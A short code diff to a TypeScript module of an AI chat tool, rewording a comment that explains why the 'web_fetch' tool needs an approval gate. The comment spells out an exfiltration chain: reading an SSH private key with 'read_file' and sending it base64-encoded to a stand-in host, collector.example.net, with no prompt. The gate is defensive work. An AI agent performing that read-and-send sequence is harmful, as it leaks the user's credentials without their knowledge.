@@ -4,8 +4,8 @@ import type { ForgeConfig } from '../config/types';
 /**
  * Which hosts a chat may fetch, and what a fetch has to ask for.
  *
- * `web_fetch` needs no approval today, so `read_file ~/.ssh/id_ed25519` followed
- * by `web_fetch https://collector.example.net/?d=<base64>` runs with no prompt:
+ * Without this gate, `read_file ~/.ssh/id_ed25519` followed by
+ * `web_fetch https://collector.example.net/?d=<base64>` would run with no prompt:
  * read the secret, send it out, nobody asked. The browser tools already solved
  * this for themselves — an origin in `browser.allowed_origins` is pre-approved,
  * any other origin asks once per browser session, and the set dies with the
